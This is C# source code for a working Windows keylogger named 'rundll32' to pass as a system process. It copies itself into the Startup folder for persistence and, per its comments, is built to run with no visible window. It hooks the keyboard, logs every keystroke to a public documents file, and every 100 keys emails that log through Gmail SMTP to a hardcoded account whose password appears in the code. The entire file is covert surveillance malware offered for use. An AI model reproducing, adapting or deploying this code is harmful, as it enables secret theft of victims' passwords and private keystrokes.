using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;

namespace rundll32
{
    class Program
    {
        /*
        for creating hidden applications
        create project as console app
        solution explorer>rightclick properties of project (or alt+enter)
        change output to windows form
        */
        public static int logged = 0;
        //keyboard hook ID
        private const int WH_KEYBOARD_LL = 13;
        //VK stuff
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        //run hook
        public static void Main()

        {
            //get current exe name and path
            String fileName = String.Concat(Process.GetCurrentProcess().ProcessName, ".exe");
            String filePath = Path.Combine(Environment.CurrentDirectory, fileName);

            //check if file exists first; errors out otherwise
            String testpath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "rundll32.exe");
            if (!File.Exists(testpath))
            {
                //copy exe into startup folder
                File.Copy(filePath, Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), fileName));
            }

            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        //write data to temp directory
        public static void WriteFile(string ToWrite)
        {
            //directory to write to
            string path = @"C:\Users\Public\Documents\dll32.txt";
            string appendText = ToWrite + Environment.NewLine;
            File.AppendAllText(path, appendText);
        }

        //create keyboard hook
        private static IntPtr SetHook(LowLevelKeyboardProc proc)

        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        //actual logging code
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                string output = Convert.ToString((Keys)vkCode);
                WriteFile(output);
                logged++;
                if (logged == 100)
                {
                    //send email and restart
                    email_send();
                    Application.Restart();
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }
        
        //send captured keystrokes to fake gmail account to check later
        public static void email_send()
        {
            MailMessage mail = new MailMessage();
            SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
            mail.From = new MailAddress("fakeemail29292@gmail.com");
            mail.To.Add("fakeemail29292@gmail.com");
            mail.Subject = "Test Mail - 1";
            mail.Body = "mail with attachment";
            Attachment attachment;
            attachment = new Attachment(@"C:\Users\Public\Documents\dll32.txt");
            mail.Attachments.Add(attachment);
            SmtpServer.Port = 587;
            SmtpServer.Credentials = new NetworkCredential("fakeemail29292@gmail.com", "thisismypassword");
            SmtpServer.EnableSsl = true;
            SmtpServer.Send(mail);
        }

        //import windows processes
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
    }
}